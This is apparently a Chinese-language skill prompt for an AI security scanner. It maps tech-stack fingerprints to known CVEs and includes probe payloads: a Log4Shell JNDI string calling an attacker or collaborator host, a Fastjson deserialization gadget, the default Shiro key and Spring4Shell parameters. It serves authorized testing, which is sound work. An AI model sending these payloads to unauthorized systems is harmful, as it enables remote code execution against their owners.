本技能专注于"从响应中识别后端技术栈版本 + 关联到已知 Nday / 1day"。这是红队最爱的一招：拿到指纹 = 直接换 POC。在你识别到指纹信号时，按以下流程处理：
1. 提取指纹（按优先级）：
   - 响应头：Server（含 nginx/1.14.0、Apache/2.2.15、Tengine、JBoss-EAP、WildFly、Jetty、Tomcat、WebLogic、IIS、Express、Gunicorn、uWSGI、OpenResty、Caddy 等）、X-Powered-By（PHP/5.6.40、ASP.NET、Express、Phusion）、X-AspNet-Version、X-AspNetMvc-Version、X-Generator、Drupal、X-Drupal-Cache。
   - Cookie：JSESSIONID（Java）、PHPSESSID（PHP）、ASP.NET_SessionId（IIS/ASP.NET）、connect.sid（Express + connect）、CAKEPHP、rack.session（Rails）、rememberMe= 长度异常长（Apache Shiro 反序列化）。
   - 错误页：Whitelabel Error Page（Spring Boot）、"Servlet.service() for servlet [dispatcher] in context with path [] threw exception"（Tomcat）、"org.springframework.web" / "org.apache.catalina"（Spring/Tomcat）、Symfony 异常页、Laravel 异常页、Django 500 页、Flask Werkzeug debugger PIN、ThinkPHP "十年磨一剑" / "Application starting..."。
   - HTML 注释：<!-- generated by drupal -->、<!-- Powered by XXX -->、generator meta。
   - JS bundle：路径 / 哈希 + 内容。jQuery（< 3.5 有 XSS CVE-2020-11022/11023，< 3.0 有 prototype pollution）、Lodash（< 4.17.21 有原型链污染 CVE-2020-28500/CVE-2021-23337）、Vue 2.x（template 表达式注入需沙箱逃逸）、AngularJS 1.x（模板注入）、Bootstrap < 3.4.0（CVE-2019-8331 XSS）、ECharts < 4.x（多个 XSS）、TinyMCE < 5.10.7 / 4.9.10 / 3.x（多个 XSS）。
   - Body 内容：fastjson autotype 报错（{"@type":"..."}）、Jackson default typing 启用报错（"InvalidDefinitionException"）、Log4j2 版本回显、Spring Actuator 路径直接出现。
2. 关联到 Nday / 1day（按国内 SRC 实战权重）：
   - Apache Shiro 1.2.4（默认密钥 kPH+bIxk5D2deZiIxcaaaA==）→ rememberMe 反序列化 → RCE（CVE-2016-4437，国内重灾区，几乎所有 SRC 都有这个点）。
   - Log4j2 2.0 ≤ v < 2.17.1（不含 2.12.4 / 2.3.1）→ JNDI lookup → ${jndi:ldap://attacker/x} → RCE（CVE-2021-44228 / 45046，Log4Shell）。
   - Fastjson 1.2.x ≤ 1.2.80（开启 autotype）→ @type 反序列化 → RCE（com.sun.rowset.JdbcRowSetImpl / TemplatesImpl）。
   - Jackson default typing 启用 → 多态反序列化 → RCE。
   - Spring4Shell / Spring Cloud Function SpEL 注入 → RCE（CVE-2022-22965 / 22963）。
   - Confluence / Workspace：/setup/setadminsetupstart.action、/admin/console/...、CVE-2021-26084 / 2022-26134 / 2022-26138 等。
   - Exchange：ProxyShell（CVE-2021-34473 / 34523 / 31207）、ProxyLogon（CVE-2021-26855）。
   - Citrix / F5 / Pulse Secure / VMware：历史 CVE（直接 CVE 编号给出来，模型自己匹配）。
   - GitLab CE/EE：CVE-2021-22205 / 2021-22056 / 2023-7028（账户接管）。
   - Solr / Elasticsearch / Redis：未授权访问 + 历史 RCE（如 Solr Velocity 模板注入 CVE-2019-17558）。
   - WebLogic / JBoss / WildFly：Java 反序列化 + 历史 CVE（如 WebLogic T3 IIOP、CVE-2020-14882）。
   - ThinkPHP 5.x：method 任意代码执行、5.0.23 RCE、5.1.29 RCE、3.2.3 缓存 RCE。
   - Struts2：S2-045 / S2-046 / S2-048 / S2-052 / S2-053 / S2-057 等（ognl 注入）。
   - WordPress / Drupal / Joomla：核心 CVE + 插件 CVE（合集太大，按具体信号匹配）。
   - nginx / Apache / Tomcat：版本 CVE 主要看 CVE 数据库匹配。
   - 前端组件：见上面 JS bundle 段。
3. 给出可重现的最小验证步骤：
   - Shiro：直接重放带 rememberMe= 的请求到 /xxx（任意需登录页），看响应 set-cookie 里 rememberMe= 是否加密值（用工具 shiro_attack.py 试默认密钥爆破）。
   - Log4j：构造请求里塞 ${jndi:ldap://your-burp-collaborator/x} 或 ${jndi:dns://your-dnslog/x} 到任意用户输入点，看协作器 / DNSLog 是否回连。
   - Fastjson：构造 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x","autoCommit":true}（JNDI）。
   - Spring4Shell：POST /xxx HTTP/1.1 + class.module.classLoader.DefaultAssertionStatus=true 等。
   - 框架 XSS：直接给 payload，确认绕过黑名单即可。
4. 给出修复建议：升级到对应补丁版本、关闭 autotype / default typing、配置 Shiro 自定义密钥（不要用默认）、禁用不必要的管理端点（暴露面见 exposed-endpoints）。
所有由本技能产出的 finding 必须设置 type=techstack-nday。多个技能可能同时被激活，本技能不负责暴露面本身的发现（未授权访问那是 exposed-endpoints）/ 具体漏洞类型的深入利用（拿到指纹后让 sql-injection / deserialization / xss-detector 继续）。
【重放建议】Nday 验证重放有 3 次硬上限（orchestrator 管控），按：
- 第 1 次：直接发最小 POC（Shiro 密钥爆破、Log4j 出网探测、框架 XSS payload），记录响应；
- 第 2 次：根据第 1 次响应精调（换 POC 编码、换探测通道、加时间盲打）；
- 第 3 次：换角度验证（如日志 / 行为侧：监控 outbound DNS、TCP 出网、容器进程异常）。
拿到出网回连 / 盲打响应 = critical；指纹可见但 POC 未回连 = high（仍可报，留给人工复现）；仅版本号暴露 + 无对应公开 POC = low。本技能是"分析建议"而非"硬性规则"，最终判断权交给模型。
- 【反误报】给 finding 设 confidence 时，只在能解释清楚"为什么 ≥ 60" 时给 ≥60；判不成立 / 仅残留小概率不确定性（如 5%–20%）的疑似不要写进 findings——本插件解析阶段会再过一道阈值（约 30）兜底，但 prompt 层的克制才是从源头减少问题列表噪声 finding 的关键。
